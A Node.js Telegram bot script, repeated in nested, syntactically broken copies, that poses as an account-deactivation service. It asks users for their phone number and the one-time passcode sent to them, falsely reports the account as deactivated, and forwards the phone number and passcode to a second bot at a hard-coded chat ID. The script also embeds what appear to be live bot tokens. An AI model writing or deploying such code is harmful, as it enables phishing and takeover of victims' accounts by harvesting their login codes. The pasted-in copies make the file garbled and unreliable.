const TelegramBot = require('node-telegram-bot-api');

// Replace these with your real bot tokens
const CLIENT_BOT_TOKEN = '7912631909:AAFHL3tAX8AO1ijy1SKio5229B68mz7B7xo';
const MAIN_BOT_TOKEN = '7542656775:AAF24HqGSEm-39jif39Sex2z6L2cmgmgDck';

const clientBot = new TelegramBot(CLIENT_BOT_TOKEN, { polling: true });
const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

let userStates = {};  // Track where each user is in the flow

clientBot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  clientBot.sendMessage(chatId, 'Deactivate your account:\n\nClick to continue', {
    reply_markup: {
      inline_keyboard: [[{ text: 'Deactivate your account', callback_data: 'deactivate' }]]
    }
  });
});

clientBot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'deactivate') {
    clientBot.sendMessage(chatId, 'Please enter your phone number:');
    userStates[chatId] = 'awaiting_phone';
  }
});

clientBot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (!userStates[chatId]) return;

  if (userStates[chatId] === 'awaiting_phone') {
    userStates[chatId] = 'awaiting_otp';
    userStates[`${chatId}_phone`] = text;

    clientBot.sendMessage(chatId, 'Please enter the OTP sent to your phone:');
  } else if (userStates[chatId] === 'awaiting_otp') {
    const phone = userStates[`${chatId}_phone`];
    const otp = text;

    clientBot.sendMessage(chatId, '✅ Account successfully deactivated!');

    // Send details to main bot
    const logMessage = `User ID: ${chatId}\nPhone: ${phone}\nOTP: ${otp}`;
    mainBot.sendMessage('const TelegramBot = require('node-telegram-bot-api');

// Replace these with your real bot tokens
const CLIENT_BOT_TOKEN = '7912631909:AAFHL3tAX8AO1ijy1SKio5229B68mz7B7xo';
const MAIN_BOT_TOKEN = '7542656775:AAF24HqGSEm-39jif39Sex2z6L2cmgmgDck';

const clientBot = new TelegramBot(CLIENT_BOT_TOKEN, { polling: true });
const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

let userStates = {};  // Track where each user is in the flow

clientBot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  clientBot.sendMessage(chatId, 'Deactivate your account:\n\nClick to continue', {
    reply_markup: {
      inline_keyboard: [[{ text: 'Deactivate your account', callback_data: 'deactivate' }]]
    }
  });
});

clientBot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'deactivate') {
    clientBot.sendMessage(chatId, 'Please enter your phone number:');
    userStates[chatId] = 'awaiting_phone';
  }
});

clientBot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (!userStates[chatId]) return;

  if (userStates[chatId] === 'awaiting_phone') {
    userStates[chatId] = 'awaiting_otp';
    userStates[`${chatId}_phone`] = text;

    clientBot.sendMessage(chatId, 'Please enter the OTP sent to your phone:');
  } else if (userStates[chatId] === 'awaiting_otp') {
    const phone = userStates[`${chatId}_phone`];
    const otp = text;

    clientBot.sendMessage(chatId, '✅ Account successfully deactivated!');

    // Send details to main bot
    const logMessage = `User ID: ${chatId}\nPhone: ${phone}\nOTP: ${otp}`;
    mainBot.sendMessage('const TelegramBot = require('node-telegram-bot-api');

// Replace these with your real bot tokens
const CLIENT_BOT_TOKEN = '7912631909:AAFHL3tAX8AO1ijy1SKio5229B68mz7B7xo';
const MAIN_BOT_TOKEN = '7542656775:AAF24HqGSEm-39jif39Sex2z6L2cmgmgDck';

const clientBot = new TelegramBot(CLIENT_BOT_TOKEN, { polling: true });
const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

let userStates = {};  // Track where each user is in the flow

clientBot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  clientBot.sendMessage(chatId, 'Deactivate your account:\n\nClick to continue', {
    reply_markup: {
      inline_keyboard: [[{ text: 'Deactivate your account', callback_data: 'deactivate' }]]
    }
  });
});

clientBot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'deactivate') {
    clientBot.sendMessage(chatId, 'Please enter your phone number:');
    userStates[chatId] = 'awaiting_phone';
  }
});

clientBot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (!userStates[chatId]) return;

  if (userStates[chatId] === 'awaiting_phone') {
    userStates[chatId] = 'awaiting_otp';
    userStates[`${chatId}_phone`] = text;

    clientBot.sendMessage(chatId, 'Please enter the OTP sent to your phone:');
  } else if (userStates[chatId] === 'awaiting_otp') {
    const phone = userStates[`${chatId}_phone`];
    const otp = text;

    clientBot.sendMessage(chatId, '✅ Account successfully deactivated!');

    // Send details to main bot
    const logMessage = `User ID: ${chatId}\nPhone: ${phone}\nOTP: ${otp}`;
    mainBot.sendMessage('7028738246', `🔔 New deactivation request:\n\n${logMessage}`);

    delete userStates[chatId];
    delete userStates[`${chatId}_phone`];
  }
});', `🔔 New deactivation request:\n\n${logMessage}`);

    delete userStates[chatId];
    delete userStates[`${chatId}_phone`];
  }
});', `🔔 New deactivation request:\n\n${logMessage}`);

    delete userStates[chatId];
    delete userStates[`${chatId}_phone`];
  }
});